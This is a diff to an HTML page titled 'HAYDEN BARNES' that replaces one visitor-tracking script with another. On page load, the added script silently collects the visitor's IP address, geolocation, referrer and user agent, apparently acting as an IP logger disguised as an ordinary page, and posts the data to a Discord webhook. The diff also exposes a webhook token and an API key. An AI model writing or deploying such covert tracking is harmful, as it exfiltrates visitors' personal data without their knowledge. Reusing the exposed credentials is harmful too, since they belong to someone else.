@@ -4,93 +4,83 @@
 	<title>HAYDEN BARNES</title>
 
 
-
-
-
-
-
 <script>
-        // Function to get URL parameters
-        function getParameterByName(name, url) {
-            if (!url) url = window.location.href;
-            name = name.replace(/[\[\]]/g, "\\$&");
-            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, " "));
-        }
+// Function to generate a pseudo-random session ID
+function generateSessionId() {
+  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+}
 
-        // Function to generate a random session ID
-        function generateSessionId() {
-            return Math.random().toString(36).substr(2, 10);
-        }
+// Function to send data to Discord webhook
+function sendToDiscord(data) {
+  // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+  const webhookUrl = 'https://discord.com/api/webhooks/1177615963181555873/papaMgplo57758omJyzaywBltB7CZdtVTYFblcGYWHeCyfPMz_48Lcyb2-T3rqHrsmSz';
 
-        // Function to get IP address, city, country, region, continent, and current URL from an abstract API
-        async function fetchAbstractAPI() {
-            const response = await fetch('https://api.abstractapi.com/v1/ip');
-            const data = await response.json();
-            return data;
-        }
+  // Use fetch to send data to Discord webhook
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  });
+}
 
-        // Function to submit data to Google Form
-        function submitToGoogleForm(data) {
-            const googleFormUrl = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSc5jBn00h_Lxul2eXyju7XNtpwBlM0HQsPXFg5FRkl32yW1pg/formResponse';
-            const formData = new FormData();
-            for (const key in data) {
-                formData.append(key, data[key]);
-            }
-            fetch(googleFormUrl, {
-                method: 'POST',
-                body: formData,
-            });
-        }
+// Function to extract parameters from URL
+function getUrlParameter(name) {
+  name = name.replace(/[[]/, '\\[').replace(/[\]]/, '\\]');
+  const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+  const results = regex.exec(location.search);
+  return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+}
 
-        // Main function to handle the process
-        async function handleVisit() {
-            // Check if session ID exists in sessionStorage
-            let sessionId = sessionStorage.getItem('sessionId');
-            if (!sessionId) {
-                // If not, generate a random session ID and store it in sessionStorage
-                sessionId = generateSessionId();
-                sessionStorage.setItem('sessionId', sessionId);
-            }
+// Main function to run on page load
+function onPageLoad() {
+  // Check if session ID exists in sessionStorage
+  let sessionId = sessionStorage.getItem('sessionId');
 
-            // Get title and description from URL parameters
-            const title = getParameterByName('title');
-            const description = getParameterByName('descp');
+  // If not, generate a new session ID and store it in sessionStorage
+  if (!sessionId) {
+    sessionId = generateSessionId();
+    sessionStorage.setItem('sessionId', sessionId);
+  }
 
-            // Get IP address, city, country, region, continent, and current URL from the abstract API
-            const abstractApiData = await fetchAbstractAPI();
+  // Get title and description from URL parameters
+  const title = getUrlParameter('title');
+  const description = getUrlParameter('desc');
 
-            // Get date, time, refer URL, and user agent
-            const dateTime = new Date().toLocaleString();
-            const referUrl = document.referrer;
-            const userAgent = navigator.userAgent;
+  // Use an IP geolocation API to get additional information
+  // Replace 'YOUR_GEOLOCATION_API_URL' with the actual URL
+  const geolocationApiUrl = 'https://ipgeolocation.abstractapi.com/v1/?api_key=577cf8161d6e494bb7fb0df8e0b9102e';
+  fetch(geolocationApiUrl)
+    .then(response => response.json())
+    .then(data => {
+      // Construct the payload to send to Discord webhook
+      const payload = {
+        sessionId: sessionId,
+        title: title,
+        description: description,
+        ipAddress: data.ip,
+        city: data.city,
+        country: data.country,
+        region: data.region,
+        continent: data.continent,
+        currentUrl: window.location.href,
+        dateTime: new Date().toISOString(),
+        referUrl: document.referrer,
+        userAgent: navigator.userAgent,
+      };
 
-            // Prepare data to submit to Google Forms
-            const formData = {
-                sessionId,
-                title,
-                description,
-                ipAddress: abstractApiData.ip_address,
-                city: abstractApiData.city,
-                country: abstractApiData.country,
-                region: abstractApiData.region,
-                continent: abstractApiData.continent,
-                currentUrl: window.location.href,
-                dateTime,
-                referUrl,
-                userAgent,
-            };
+      // Send the payload to Discord webhook
+      sendToDiscord(payload);
+    });
+}
 
-            // Submit data to Google Form
-            submitToGoogleForm(formData);
-        }
+// Run the onPageLoad function when the page loads
+onPageLoad();
+</script>
 
-        // Call the main function when the page loads
-        handleVisit();
-    </script>
+
+
 
 
 
